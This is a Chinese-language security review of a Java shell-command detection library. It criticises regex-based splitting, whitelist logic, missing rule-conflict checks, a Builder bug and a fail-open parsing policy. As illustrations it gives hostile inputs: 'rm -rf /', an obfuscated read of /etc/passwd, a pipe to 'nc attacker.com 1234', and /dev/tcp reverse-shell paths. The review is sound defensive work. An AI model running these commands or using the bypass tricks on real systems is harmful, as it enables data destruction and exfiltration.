# Shell 高危指令检测类库 - 专家审查报告 (Gemini Review)

**版本**: 1.0
**日期**: 2026-03-22
**目标**: 评估 WebShell 防御能力、规则引擎严谨性及系统架构质量。

---

## 1. 核心评估结论

当前实现虽然初步搭建了 Fluent API 和规则匹配框架，但在**防御 WebShell 攻击**和**规则驱动的严谨性**方面存在重大缺陷。主要表现为：设计文档承诺的 ANTLR 解析在实现中被弱化为简单的正则分割，导致绕过成本极低；Builder 模式存在配置覆盖 Bug；缺乏规则冲突检测机制。

---

## 2. 关键设计与实现问题

### 2.1 虚假的“解析”：正则分割 vs ANTLR (高危)
*   **问题描述**: 设计文档声明使用 ANTLR 处理 Bash 语法，但代码中 `ShellCommandExtractor` 仅使用 `[;|&]` 正则进行硬拆分。
*   **代码位置**: `src/main/java/com/example/shelldetector/parser/ShellCommandExtractor.java:31`
    ```java
    private static final Pattern COMMAND_DELIMITERS = Pattern.compile("[;|&]");
    ```
*   **安全影响**: 
    1.  **引号绕过**: `echo "Hello; rm -rf /"` 会被拆分为 `echo "Hello` 和 `rm -rf /"`，导致 `rm` 被拦截，造成误报。
    2.  **混淆绕过**: 无法识别 `c'a't /etc/passwd`，因为正则 `^cat` 无法匹配混淆后的字符串。
    3.  **转义字符**: `echo \; rm -rf /` 中的分号被转义，本不应作为分隔符，但会被正则切开。
*   **改进建议**: 必须兑现 ANTLR 实现。在 `extractCommands` 中使用 ANTLR 生成的 `BashParser` 提取 `SimpleCommand` 节点，并剥离引号还原真实命令名。

### 2.2 白名单匹配逻辑不完备 (中危)
*   **问题描述**: 需求要求“所有子命令（含重定向符等）都匹配”才放行。目前的逻辑拆分了管道符但忽略了对管道符本身的合法性校验。
*   **代码位置**: `src/main/java/com/example/shelldetector/core/RuleMatcher.java:94` (`areAllCommandsWhitelisted` 方法)
*   **逻辑漏洞**: 
    1.  如果命令是 `ls | nc attacker.com 1234`，执行 `extractCommands` 会拆出 `ls` 和 `nc ...`。
    2.  如果白名单包含 `ls`，而 `nc` 既不在白名单也不在黑名单，且风险评估未达标，管道符带来的风险就被漏掉了。
*   **改进建议**: 增加“允许的连接符/操作符”白名单配置。在子命令匹配阶段，必须确保所有的连接符（如 `|`, `&&`）也符合规则。

### 2.3 规则冲突检测缺失 (中危)
*   **问题描述**: 需求要求“如果规则配置冲突应提示用户”。目前代码完全没有冲突扫描逻辑。
*   **潜在风险**: 用户可能在白名单中定义了 `ls`，在黑名单中也定义了 `ls`。虽然当前逻辑是白名单优先，但没有提示会导致维护混乱。
*   **改进建议**: 在 `ShellDetector.Builder.build()` 中调用 `RuleConflictChecker`。遍历所有白名单正则，检查是否与黑名单正则存在潜在冲突。

### 2.4 Builder 模式配置覆盖 Bug (低危)
*   **问题描述**: `withThreshold` 方法会创建一个全新的 `DetectionConfig` 对象，覆盖掉之前通过 `withConfig` 设置的其他属性（如 `failOnParseError`）。
*   **代码位置**: `src/main/java/com/example/shelldetector/ShellDetector.java:214`
    ```java
    public Builder withThreshold(RiskLevel threshold) {
        // ...
        this.config = DetectionConfig.builder().threshold(threshold).build(); // 此处覆盖了整个 config
        return this;
    }
    ```
*   **改进建议**: 保持原有 `config` 引用，仅修改属性，或者实现配置的 Deep Copy。

---

## 3. 针对 WebShell 防御的专项改进建议

1.  **加固内置重定向规则**: 
    *   **代码位置**: `src/main/resources/builtin-rules.json` 中的 `builtin-file-write` 规则。
    *   **优化建议**: 针对容器安全，不仅要拦截 `>`，还要关注 `/dev/tcp/` 这种反弹 Shell 常用的重定向路径。

2.  **解析失败的默认策略**:
    *   **代码位置**: `src/main/java/com/example/shelldetector/core/DetectionEngine.java:108`
    *   **逻辑漏洞**: 如果解析出错且 `failOnParseError` 为 `false`，则直接 `passed(true)`。
    *   **安全风险**: 恶意混淆往往导致解析复杂。**“无法解析”通常应视为“最高风险”**。
    *   **建议**: 默认行为改为：若无法解析，且配置为不抛异常，应返回 `passed(false)` 并标记为未知风险。

---

## 4. 后续演进路线图 (Roadmap)

1.  **P0 (Security)**: 引入 ANTLR 解析 `BashLexer.g4` 和 `BashParser.g4`，处理引号剥离。
2.  **P0 (Reliability)**: 修复 Builder 覆盖 Bug，确保配置一致性。
3.  **P1 (Integrity)**: 实现 `RuleConflictChecker`，在启动时扫描冲突规则。
4.  **P2 (Observability)**: 在 `DetectionResult` 中增加命中规则的 ID 列表，便于审计拦截原因。
